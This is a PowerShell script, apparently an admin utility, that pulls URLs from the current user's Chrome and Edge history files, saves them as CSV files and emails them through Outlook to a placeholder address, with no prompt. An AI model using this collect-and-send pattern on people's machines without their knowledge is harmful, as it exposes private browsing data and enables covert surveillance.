function Get-EdgeHistory {
    $Path = "$Env:systemdrive\Users\$Env:USERNAME\AppData\Local\Microsoft\Edge\User Data\Default\History"
    if (-not (Test-Path -Path $Path)) {
        Write-Verbose "[!] Could not find Chrome History for username: $Env:USERNAME"
    } else {
        $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
        $Value = Get-Content -Path $Path | Select-String -AllMatches $regex | % {($_.Matches).Value} | Sort -Unique
        foreach ($url in $Value) {
            New-Object -TypeName PSObject -Property @{
                User = $env:UserName
                Browser = 'Edge'
                DataType = 'History'
                Data = $url
            }
        }
    }
}

function Get-ChromeHistory {
    $Path = "$Env:SystemDrive\Users\$Env:USERNAME\AppData\Local\Google\Chrome\User Data\Default\History"
    if (-not (Test-Path -Path $Path)) {
        Write-Verbose "[!] Could not find Chrome History for username: $Env:USERNAME"
    } else {
        $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
        $Value = Get-Content -Path $Path | Select-String -AllMatches $regex | % {($_.Matches).Value} | Sort -Unique
        foreach ($url in $Value) {
            New-Object -TypeName PSObject -Property @{
                User = $env:UserName
                Browser = 'Chrome'
                DataType = 'History'
                Data = $url
            }
        }
    }
}

$adminfolder = "c:\Admin"  # CHANGE FOLDER
New-Item $adminfolder -ItemType Directory -Force

$chromeHistory = Get-ChromeHistory
$chromeHistory | Export-Csv -Path "C:\Admin\chrome_history.csv" -Force -NoTypeInformation  # CHANGE PATH
$edgeHistory = Get-EdgeHistory
$edgeHistory | Export-Csv -Path "C:\Admin\edge_history.csv" -Force -NoTypeInformation  # CHANGE PATH

# Create a new Outlook application object
$outlookProcess = Get-Process -Name outlook -ErrorAction SilentlyContinue
$outlook = New-Object -ComObject Outlook.Application
# Create a new mail item
$mail = $outlook.CreateItem(0)
# Set the email properties
$mail.Subject = "Browsing History for Edge and Chrome"
$mail.Body = "Please find attached my browsing history"
$mail.To = "mailbox@domain.com"   # CHANGE EMAIL ADDRESS
# Add multiple attachments
$attachments = @("C:\\Admin\\chrome_history.csv", "C:\\Admin\\edge_history.csv")   # CHANGE PATHS
foreach ($attachment in $attachments) {
    $mail.Attachments.Add($attachment)
}
# Send the email
$mail.Send()